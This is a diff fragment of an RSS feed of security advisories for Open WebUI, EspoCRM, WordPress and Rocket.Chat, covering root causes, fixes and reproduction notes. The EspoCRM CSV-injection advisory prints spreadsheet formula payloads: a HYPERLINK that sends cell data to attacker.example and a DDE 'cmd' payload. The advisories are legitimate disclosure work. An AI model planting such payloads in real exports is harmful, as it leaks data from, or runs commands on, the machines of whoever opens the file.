-Providers that do not implement RFC 7662 introspection, including Google, Microsoft Entra ID, GitHub and Feishu, cannot be restricted this way at all. **On those, token exchange has no safe configuration and should be left disabled.**&#13;
-&#13;
-## Root cause&#13;
-&#13;
-- `backend/open_webui/routers/auths.py`, `token_exchange` (`POST /api/v1/auths/oauth/{provider}/token/exchange`)&#13;
-&#13;
-Token exchange skips the authorization-code step entirely and trusts a token supplied by the caller. The only validation performed was a userinfo lookup, which answers whether a token is valid rather than who issued it, so the endpoint had no way to distinguish a token minted for Open WebUI from one minted for an unrelated application.&#13;
-&#13;
-## Proof of concept&#13;
-&#13;
-Reproduced against a mock OIDC provider serving two tokens for the same end user, minted for two different clients, with `OAUTH_ALLOWED_DOMAINS=corp.example` actively enforced.&#13;
-&#13;
-| Case | Token | Result |&#13;
-| --- | --- | --- |&#13;
-| Control | not recognised by the provider | 400 rejected |&#13;
-| Outsider's own account, non-allowed domain | minted for `attacker-evil-app` | 403 blocked by domain allowlist |&#13;
-| Victim's account, foreign client | minted for `attacker-evil-app` | 200, session issued for `victim@corp.example` |&#13;
-&#13;
-The issued session token was confirmed usable: `GET /api/v1/auths/` returned 200 authenticated as the victim. The provider log recorded the token as minted for `client_id='attacker-evil-app'`, while Open WebUI's own client is `openwebui-client-id`.&#13;
-&#13;
-## Credits&#13;
-&#13;
-Reported by @Classic298.</description>
-      <guid isPermaLink="false">GHSA-rq84-p6rr-vf89</guid>
-      <category>HIGH</category>
-      <category>open-webui/open-webui</category>
-      <pubDate>Sun, 02 Aug 2026 21:03:25 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] espocrm/espocrm — Admin path traversal in Label Manager allowing arbitrary JSON file read, write and delete (CVE-2026-63130)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-jr5q-25fw-27f8</link>
-      <description>CVE-2026-63130 · CVSS 5.5 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:L) · CWE-22
-
-Affected:
-- php/EspoCRM &lt;=9.3.9 (patched: 9.3.10)
-
----
-
-## Summary&#13;
-&#13;
-EspoCRM contains a path traversal vulnerability in the administrative Label Manager functionality. Due to insufficient validation of file paths, an authenticated administrator can perform unauthorized file operations on JSON files accessible to the application, including reading, modifying, creating, or deleting files outside the intended directory, subject to server configuration and filesystem permissions.</description>
-      <guid isPermaLink="false">GHSA-jr5q-25fw-27f8</guid>
-      <category>MEDIUM</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Tue, 28 Jul 2026 10:23:29 +0000</pubDate>
-    </item>
-    <item>
-      <title>[LOW] pip:open-webui — Open WebUI: Cross-user model-list exposure via static cache key in get_all_models (aiocache key= vs key_builder= misuse) (CVE-2026-59213)</title>
-      <link>https://github.com/advisories/GHSA-3wp3-xxj9-5jqq</link>
-      <description>CVE-2026-59213 · CVSS 3.5 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:N/A:N) · CWE-524
-
-Affected:
-- pip/open-webui &gt;= 0.6.27, &lt; 0.10.0 (patched: 0.10.0)
-
----
-
-## Summary
-
-The `get_all_models` handlers in `routers/openai.py` and `routers/ollama.py` intended to cache their **permission-filtered** model lists per user, but the `@cached` decorator was misconfigured: it passed a `key=` lambda instead of `key_builder=`. In aiocache 0.12.3 (the pinned version), `key=` is a **static** cache key — a callable passed there is used as a constant object, not invoked per call. As a result the per-user key was never computed, and all callers collided onto a single shared cache entry within the TTL window. During that window, one user's permission-filtered model list could be served to a different authenticated user, crossing the per-user authorization boundary.
-
-## Impact
-
-- **Boundary crossed:** Confidentiality (cross-user). A caller can receive the model list scoped to a *different* security principal than themselves.
-- A user (or admin, or — depending on endpoint reachability — anonymous caller) who populates the cache causes the next caller within the TTL to receive *that* list rather than their own permission-filtered one.
-- What's disclosed is the set of models another principal can access, including potentially the existence and naming of models restricted from the receiving user.
-- Exposure is **incidental and timing-dependent**, not attacker-controlled: the leaked entry is whatever the most recent caller populated within `MODELS_CACHE_TTL` (default 1 second), and the attacker cannot select the victim or force a target's list into the cache.
-
-## Affected component
-
-- `backend/open_webui/routers/openai.py` — `get_all_models` (~line 488)
-- `backend/open_webui/routers/ollama.py` — `get_all_models` (~line 302)
-
-Both decorated with `@cached(ttl=MODELS_CACHE_TTL, key=lambda ...)`. No other `@cached(... key=lambda ...)` misuse was found elsewhere in the backend.
-
-## Root cause
-
-aiocache 0.12's `@cached` treats `key=` as a static key; the per-call hook is `key_builder=` with signature `key_builder(func, *args, **kwargs)`. Passing a callable to `key=` uses the callable object itself as a constant key, so every invocation resolved to the same entry and the intended per-`user.id` namespacing never occurred.
-
-## Reproduction (default config)
-
-1. On a default deployment, configure at least two users with *different* model-access permissions (e.g. one model restricted to user A).
-2. As user A, request the model list (populates the shared cache entry).
-3. Within `MODELS_CACHE_TTL` (default 1s), as user B, request the model list.
-4. User B receives user A's permission-filtered list, including models B is not permitted to see.
-
-## Remediation
-
-Replace `key=` with `key_builder=` at both call sites and adjust the lambda to take the function as its first argument:
-
-```python
-@cached(
-    ttl=MODELS_CACHE_TTL,
-    key_builder=lambda _func, request, user=None: (
-        f'openai_all_models_{user.id}' if user else 'openai_all_models'
-    ),
-)
-```</description>
-      <guid isPermaLink="false">GHSA-3wp3-xxj9-5jqq</guid>
-      <category>LOW</category>
-      <category>pip:open-webui</category>
-      <pubDate>Fri, 24 Jul 2026 17:03:21 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] pip:open-webui — Open WebUI: Realtime endpoints accept Redis-revoked JWTs after signout/backchannel logout (CVE-2026-59219)</title>
-      <link>https://github.com/advisories/GHSA-855v-hq7w-jmjw</link>
-      <description>CVE-2026-59219 · CVSS 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) · CWE-613
-
-Affected:
-- pip/open-webui &gt;= 0.9.0, &lt; 0.10.0 (patched: 0.10.0)
-
----
-
-## Summary
-
-With Redis configured, Open WebUI supports JWT revocation: `POST /api/v1/auths/signout` (per-token `jti`) and OIDC back-channel logout (per-user `revoked_at`) record revocations in Redis, and HTTP auth (`get_current_user`) rejects revoked tokens with 401. The realtime authentication surfaces do not perform this check: Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth validate tokens with `decode_token()` only (signature + expiry). A JWT revoked by sign-out or back-channel logout therefore continues to authenticate new realtime connections, even though the same token is rejected on HTTP.
-
-## Affected component
-
-- `backend/open_webui/socket/main.py` — Socket.IO `connect`, `user-join`, `join-channels`, `join-note`
-- `backend/open_webui/routers/terminals.py` — terminal websocket first-message auth
-- `backend/open_webui/utils/auth.py` — the revocation check was applied to HTTP only
-
-## Root cause
-
-HTTP auth enforces revocation:
-
-```python
-# utils/auth.py — get_current_user
-if data.get('jti') and not await is_valid_token(request, data):
-    raise HTTPException(status_code=401, detail='Invalid token')
-```
-
-Realtime auth calls `decode_token()` only, which verifies signature + expiry but never consults the Redis revocation keys (`{prefix}:auth:token:{jti}:revoked`, `{prefix}:auth:user:{id}:revoked_at`):
-
-```python
-# socket/main.py — connect / user-join / join-channels / join-note
-data = decode_token(auth['token'])
-# routers/terminals.py — _resolve_authenticated_connection
-data = decode_token(token)
-```
-
-## Impact
-
-A JWT revoked by user sign-out or OIDC back-channel logout still authenticates new realtime connections. A stolen token therefore retains realtime access after the victim signs out or the IdP performs back-channel logout — the very remediation for a compromised token. The token can populate `SESSION_POOL` as the victim, join their user/channel/note rooms (receiving realtime channel messages, collaborative-note updates and presence), drive socket-level collaboration as the victim, and pass terminal websocket authentication when terminal servers are configured. HTTP remains correctly protected (401), so REST data and state-changing REST endpoints are not reachable with the revoked token.
-
-## Proof of Concept
-
-Reporter PoC on a Redis-backed deployment (v0.9.6 and main): after `POST /api/v1/auths/signout`, HTTP returns 401 for the token while a Socket.IO user-join with the same token still authenticates, and the terminal WS reaches terminal-server lookup rather than rejecting it as `Invalid token`.
-
-## Fix
-
-Apply the revocation check on the realtime paths. The logic is factored into `is_token_revoked(redis, decoded)` (covering per-token `jti` and per-user `revoked_at`); the Socket.IO handlers and the terminal WS reject tokens that fail it, using the main app Redis where revocations are stored. HTTP `is_valid_token` delegates to the same helper, so HTTP behaviour is unchanged.
-
-## Affected / Patched
-
-- Affected: `&gt;= 0.9.0, &lt; 0.10.0`, and only when Redis is configured (without Redis, per-token revocation is not supported and sign-out does not invalidate JWTs by design).
-- Patched: v0.10.0. The revocation check (`is_valid_token`, covering per-token `jti` and per-user `revoked_at`) is applied on Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth, using the main app Redis where revocations are stored. HTTP `is_valid_token` delegates to the same logic, so HTTP behaviour is unchanged.</description>
-      <guid isPermaLink="false">GHSA-855v-hq7w-jmjw</guid>
-      <category>HIGH</category>
-      <category>pip:open-webui</category>
-      <pubDate>Fri, 24 Jul 2026 17:00:11 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] WordPress/wordpress-develop — Facilitated SQL injection vulnerability in the `author__not_in` parameter of `WP_Query` (CVE-2026-60137)</title>
-      <link>https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf</link>
-      <description>CVE-2026-60137
-
-Affected:
-- wordpress/WordPress 6.8.0 - 6.8.5 (patched: 6.8.6)
-- wordpress/WordPress 6.9.0 - 6.9.4 (patched: 6.9.5)
-- wordpress/WordPress 7.0.0 - 7.0.1 (patched: 7.0.2)
-
----
-
-WordPress versions 6.8 and higher are vulnerable to an SQL injection issue.&#13;
-&#13;
-In WordPress versions 6.9 and higher, this combined with a REST API batch-route confusion issue (GHSA-ff9f-jf42-662q) leads to Remote Code Execution.&#13;
-&#13;
-WordPress versions 7.0.2, 6.9.5, 6.8.6, and 7.1 beta2 have been released, containing fixes for the vulnerability.&#13;
-&#13;
-Due to the severity of the vulnerability it is recommended that you update your sites immediately.&#13;
-&#13;
-Discovered and responsibly disclosed as a team by TF1T, dtro, and haongo.</description>
-      <guid isPermaLink="false">GHSA-fpp7-x2x2-2mjf</guid>
-      <category>MEDIUM</category>
-      <category>WordPress/wordpress-develop</category>
-      <pubDate>Fri, 17 Jul 2026 19:00:52 +0000</pubDate>
-    </item>
-    <item>
-      <title>[CRITICAL] WordPress/wordpress-develop — REST API batch-route confusion and SQL injection issue leading to Remote Code Execution (CVE-2026-63030)</title>
-      <link>https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q</link>
-      <description>CVE-2026-63030
-
-Affected:
-- wordpress/WordPress 6.9.0 - 6.9.4 (patched: 6.9.5)
-- wordpress/WordPress 7.0.0 - 7.0.1 (patched: 7.0.2)
-
----
-
-WordPress versions 6.9 and higher are vulnerable to a REST API batch-route confusion weakness, which combined with an SQL injection issue ([GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf)) leads to Remote Code Execution.&#13;
-&#13;
-WordPress versions 7.0.2, 6.9.5, and 7.1 beta2 have been released, containing fixes for the vulnerability.&#13;
-&#13;
-Due to the severity of the vulnerability it is recommended that you update your sites immediately.&#13;
-&#13;
-Discovered and responsibly disclosed by Adam Kues at Assetnote / Searchlight Cyber.</description>
-      <guid isPermaLink="false">GHSA-ff9f-jf42-662q</guid>
-      <category>CRITICAL</category>
-      <category>WordPress/wordpress-develop</category>
-      <pubDate>Fri, 17 Jul 2026 19:00:46 +0000</pubDate>
-    </item>
-    <item>
-      <title>[LOW] espocrm/espocrm — Stored XSS in wysiwyg template fields if CSP is disabled (CVE-2026-55184)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-x5p5-8mxj-9wv6</link>
-      <description>CVE-2026-55184 · CVSS 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N) · CWE-79
-
-Affected:
-- composer/espocrm/espocrm &lt;= 9.3.8 (patched: 9.3.9)
-
----
-
-### Summary&#13;
-&#13;
-EspoCRM's client-side HTML sanitizer (moderateSanitizeHtml()) can be bypassed using crafted HTML, allowing users with Email Template or PDF Template edit permissions to store malicious JavaScript. When another user opens the template in edit mode, the payload executes. If Content Security Policy is disabled (clientCspDisabled = true), this leads to stored XSS and can result in full session hijacking.&#13;
-&#13;
-Note that by default CSP is enabled, making this vulnerability much less likely to be exploited. &#13;
-</description>
-      <guid isPermaLink="false">GHSA-x5p5-8mxj-9wv6</guid>
-      <category>LOW</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Tue, 14 Jul 2026 09:09:36 +0000</pubDate>
-    </item>
-    <item>
-      <title>[LOW] espocrm/espocrm — CSV/Formula Injection (CWE-1236) sanitizer bypass via leading whitespace/control characters in export (CVE-2026-55154)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-xrwp-2gph-985x</link>
-      <description>CVE-2026-55154
-
-Affected:
-- composer/espocrm/espocrm &lt;= 9.3.8 (patched: 9.3.9)
-
----
-
-## Vulnerability Details&#13;
-&#13;
-**Files**:&#13;
-- `application/Espo/Tools/Export/Format/Csv/Processor.php` (`sanitizeCellValue()`, ~line 107-122)&#13;
-- `application/Espo/Tools/Export/Format/Xlsx/OpenSpoutProcessor.php` (`sanitizeCellValue()`, ~line 279-294)&#13;
-- `application/Espo/Tools/Export/Format/Xlsx/PhpSpreadsheetProcessor.php` (`sanitizeCellValue()`, ~line 622-641)&#13;
-&#13;
-**CWE**: CWE-1236 — Improper Neutralization of Formula Elements in a CSV File&#13;
-**Severity**: Medium&#13;
-**CVSS**: 5.4 — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N&#13;
-&#13;
-### Root Cause&#13;
-&#13;
-EspoCRM already implements a CSV/Formula Injection mitigation: if an exported field's value&#13;
-begins with `=`, `+`, `-`, or `@`, the export processors prefix the value with a single quote&#13;
-`'` so spreadsheet programs (Excel, LibreOffice, Google Sheets) treat the cell as text rather&#13;
-than as a formula.&#13;
-&#13;
-However, all three `sanitizeCellValue()` implementations only inspect `$value[0]` — the&#13;
-literal first byte of the string:&#13;
-&#13;
-```php&#13;
-private function sanitizeCellValue(string $value): string&#13;
-{&#13;
-    if ($value === '') {&#13;
-        return $value;&#13;
-    }&#13;
-&#13;
-    if (is_numeric($value)) {&#13;
-        return $value;&#13;
-    }&#13;
-&#13;
-    if (in_array($value[0], ['+', '-', '@', '='])) {&#13;
-        return "'" . $value;&#13;
-    }&#13;
-&#13;
-    return $value;&#13;
-}&#13;
-```&#13;
-&#13;
-Microsoft Excel (and other spreadsheet apps) will still evaluate a cell as a formula even&#13;
-when the formula-trigger character (`=`, `+`, `-`, `@`) is preceded by whitespace or control&#13;
-characters such as a tab (`\t`, 0x09) or carriage return (`\r`, 0x0D) — Excel trims leading&#13;
-whitespace/control characters before deciding whether the cell content is a formula.&#13;
-&#13;
-A value like `"\t=1+1+cmd|\"/C calc\"!A0"` has `$value[0] === "\t"`, which is **not** in&#13;
-`['+','-','@','=']`, so the sanitizer returns the value unchanged. The raw, un-prefixed&#13;
-payload is written to the exported CSV/XLSX file and delivered to the user.&#13;
-&#13;
-### Attack Scenario&#13;
-&#13;
-1. A low-privilege user (e.g. a Sales rep or Portal user, depending on entity-level&#13;
-   create/edit ACL) sets a free-text field they control — e.g. their own Contact&#13;
-   "Description", a Lead field, a custom text field, or a Note body — to a value beginning&#13;
-   with a tab character followed by a formula-injection payload, e.g.:&#13;
-   `\t=HYPERLINK("http://attacker.example/leak?d="&amp;A1&amp;A2,"Click")`&#13;
-2. An admin/manager later exports the corresponding list (Contacts, Leads, Notes, etc.) to&#13;
-   CSV or XLSX via the standard Export feature (`POST /Export`).&#13;
-3. The exported file contains the attacker-controlled cell starting with `\t=...`,&#13;
-   unescaped (no leading `'`).&#13;
-4. The admin opens the file in Excel/LibreOffice. The leading tab is stripped/ignored by the&#13;
-   spreadsheet's formula parser, the cell is evaluated as a formula, and the payload&#13;
-   executes (e.g. external link / data exfiltration via `HYPERLINK`/`WEBSERVICE`, or — on&#13;
-   legacy Excel configurations with DDE enabled — command execution).&#13;
-&#13;
-### Impact&#13;
-&#13;
-- Client-side formula execution in the spreadsheet application of whoever opens the&#13;
-  exported CSV/XLSX file (typically an admin/manager with access to Export).&#13;
-- Potential data exfiltration via formulas referencing other cells / making outbound HTTP&#13;
-  requests (`HYPERLINK`, `WEBSERVICE`).&#13;
-- On legacy Excel configurations, potential command execution via DDE.&#13;
-- Requires authenticated low-privilege attacker plus victim user interaction (opening the&#13;
-  exported file and accepting any Excel security prompts), so impact is bounded but real —&#13;
-  this is the same vulnerability class EspoCRM has already chosen to mitigate; the existing&#13;
-  mitigation is simply incomplete.&#13;
-&#13;
-### Vulnerable Code&#13;
-&#13;
-```php&#13;
-private function sanitizeCellValue(string $value): string&#13;
-{&#13;
-    if ($value === '') {&#13;
-        return $value;&#13;
-    }&#13;
-&#13;
-    if (is_numeric($value)) {&#13;
-        return $value;&#13;
-    }&#13;
-&#13;
-    if (in_array($value[0], ['+', '-', '@', '='])) {&#13;
-        return "'" . $value;&#13;
-    }&#13;
-&#13;
-    return $value;&#13;
-}&#13;
-```&#13;
-(identical pattern duplicated in all three export processors; the PhpSpreadsheetProcessor&#13;
-variant takes `mixed $value` with an additional `is_string()` guard at the top)&#13;
-&#13;
-### Recommended Fix&#13;
-&#13;
-Trim leading whitespace/control characters before checking the first character, and prefix&#13;
-the *original* (untrimmed) value with `'` if the trimmed value starts with a dangerous&#13;
-character:&#13;
-&#13;
-```php&#13;
-private function sanitizeCellValue(string $value): string&#13;
-{&#13;
-    if ($value === '') {&#13;
-        return $value;&#13;
-    }&#13;
-&#13;
-    if (is_numeric($value)) {&#13;
-        return $value;&#13;
-    }&#13;
-&#13;
-    $trimmed = ltrim($value, " \t\r\n\v\0");&#13;
-&#13;
-    if ($trimmed !== '' &amp;&amp; in_array($trimmed[0], ['+', '-', '@', '='])) {&#13;
-        return "'" . $value;&#13;
-    }&#13;
-&#13;
-    return $value;&#13;
-}&#13;
-```&#13;
-&#13;
-### Verification&#13;
-&#13;
-Dynamically confirmed on v9.3.8 in a Docker lab (`espocrm/espocrm:9.3.8` + `mariadb:11`):&#13;
-- Created a Lead with `description = "\t=1+1+cmd|\"/C calc\"!A0"`.&#13;
-- Exported via `POST /api/v1/Export` with `format=csv` and `format=xlsx`.&#13;
-- CSV output (raw bytes, `cat -A`):&#13;
-  `TestLead,"^I=1+1+cmd|""/C calc""!A0"$` — no leading `'`, cell starts with TAB then `=`.&#13;
-- XLSX `xl/sharedStrings.xml`:&#13;
-  `&lt;si&gt;&lt;t xml:space="preserve"&gt;\t=1+1+cmd|&amp;quot;/C calc&amp;quot;!A0&lt;/t&gt;&lt;/si&gt;` — same bypass.&#13;
-- Control case `description = "=1+1"` was correctly prefixed to `'=1+1` in both formats,&#13;
-  confirming the existing mitigation logic is reachable but bypassable via a leading&#13;
-  whitespace/control character.&#13;
-</description>
-      <guid isPermaLink="false">GHSA-xrwp-2gph-985x</guid>
-      <category>LOW</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Tue, 14 Jul 2026 09:09:22 +0000</pubDate>
-    </item>
-    <item>
-      <title>[LOW] espocrm/espocrm — Persistent XSS via CSP nonce injection in applicationName setting by admin user (CVE-2026-53575)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-f34h-xxmv-j9xp</link>
-      <description>CVE-2026-53575 · CVSS 2.7 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N) · CWE-79
-
----
-
-## Summary&#13;
-&#13;
-An administrator can inject a JavaScript file into the application page, potentially causing data leakage, including unsaved user input.&#13;
-</description>
-      <guid isPermaLink="false">GHSA-f34h-xxmv-j9xp</guid>
-      <category>LOW</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Tue, 14 Jul 2026 09:09:08 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] espocrm/espocrm — Pre-authentication stored HTML injection in stream notification emails about email received (CVE-2026-59994)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-3rh4-9hcq-g79m</link>
-      <description>CVE-2026-59994 · CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)
-
-Affected:
-- composer/espocrm/espocrm &lt;= 9.3.8 (patched: 9.3.9)
-
----
-
-### Summary&#13;
-&#13;
-An unauthenticated, remote attacker can inject arbitrary HTML (and, depending on therecipient's mail client, executable JavaScript) into the **"Email Received" streamnotification emails** that EspoCRM sends to internal users. The attacker only needs to send anormal email to an address that EspoCRM monitors (e.g. a group/IMAP account configured foremail‑to‑Case). The plain‑text body of that email is stored verbatim and later rendered **unescaped** into the HTML notification delivered to every user following the related record.&#13;
-&#13;
-This is the same vulnerability class that EspoCRM already fixed for the *Post* and *Mention*notifications (commit `27b1ce882b`, which switched those paths to`Markdown::transform()` with inline‑HTML stripping). That fix did **not** cover the "Email Received" notification path, which still emits the attacker‑controlled value raw.&#13;
-</description>
-      <guid isPermaLink="false">GHSA-3rh4-9hcq-g79m</guid>
-      <category>MEDIUM</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Tue, 14 Jul 2026 09:08:42 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] espocrm/espocrm — Authenticated blind SQL injection via streamAttachments where-clause complex expression (CVE-2026-53574)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-qgm7-fc9g-fj75</link>
-      <description>CVE-2026-53574 · CVSS 7.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L) · CWE-89
-
-Affected:
-- composer/espocrm/espocrm &gt;= 8.1.0, &lt;= 9.3.7 (patched: 9.3.8)
-
----
-
-## Summary&#13;
-&#13;
-The GET `/api/v1/&lt;Entity&gt;/&lt;id&gt;/streamAttachments` endpoint is vulnerable to blind SQL injection through the where parameter due to improper validation of complex expressions. An authenticated non-admin user can use a boolean-based blind SQL injection to extract arbitrary database information, including active administrator session tokens, leading to full privilege escalation. The issue arises because this endpoint does not prohibit complex expressions, unlike other query paths.&#13;
-&#13;
-## Credit&#13;
-&#13;
-Jan Kahmen, [turingpoint](https://turingpoint.de) (jan@turingpoint.de)</description>
-      <guid isPermaLink="false">GHSA-qgm7-fc9g-fj75</guid>
-      <category>HIGH</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Mon, 13 Jul 2026 06:44:01 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] RocketChat/Rocket.Chat — Insecure implementation of websocket notifications (CVE-2026-72918)</title>
-      <link>https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-27jx-236m-3f5j</link>
-      <description>CVE-2026-72918 · CVSS 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
-
-Affected:
-- Rocket.Chat &lt;8.6.1, &lt;8.5.2, &lt;8.4.5, &lt;8.3.7, &lt;8.2.7, &lt;8.1.7, &lt;8.0.8, &lt;7.10.14 (patched: 8.6.1, 8.5.2, 8.4.5, 8.3.7, 8.2.7, 8.1.7, 8.0.8, 7.10.14)
-
----
-
-The Rocket.Chat web application supports many types of notifications, implemented as subscriptions to specific streams via the WebSocket protocol. The `stream-notify-user` stream is implemented insecurely. It is intended for notifications from other users and allows arbitrary authorized users to write arbitrary messages to it. The sender of the message is not checked and the client side UI generates notifications based only on the parameters passed in the notification body. Using this vulnerability, an attacker can create an ephemeral fake message in a user's currently open chat.</description>
-      <guid isPermaLink="false">GHSA-27jx-236m-3f5j</guid>
-      <category>MEDIUM</category>
-      <category>RocketChat/Rocket.Chat</category>
-      <pubDate>Sat, 11 Jul 2026 06:22:43 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] RocketChat/Rocket.Chat — Broken Access Control in channels.convertToTeam Allows Unauthorized Conversion of Public Channels into Teams (CVE-2026-72919)</title>
-      <link>https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-4mvx-9h2h-hmg3</link>
-      <description>CVE-2026-72919 · CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) · CWE-862
-
-Affected:
-- other/Rocket.Chat &lt;8.6.1, &lt;8.5.2, &lt;8.4.5, &lt;8.3.7, &lt;8.2.7, &lt;8.1.7, &lt;8.0.8, &lt;7.10.14 (patched: 8.6.1, 8.5.2, 8.4.5, 8.3.7, 8.2.7, 8.1.7, 8.0.8, 7.10.14)
-
----
-
-### Summary&#13;
-The `channels.convertToTeam` REST endpoint lets any authenticated user convert an arbitrary public channel they have no relationship to into a team, simply by identifying the channel with `channelName` instead of `channelId` in the request body. The endpoint's own default permission (`create-team`) is granted to every registered user, and the one guard meant to restrict this to the channel's actual owner/moderator/admin (`edit-room`) is only evaluated when `channelId` is supplied.</description>
-      <guid isPermaLink="false">GHSA-4mvx-9h2h-hmg3</guid>
-      <category>MEDIUM</category>
-      <category>RocketChat/Rocket.Chat</category>
-      <pubDate>Sat, 11 Jul 2026 06:19:59 +0000</pubDate>
     </item>
   </channel>
 </rss>
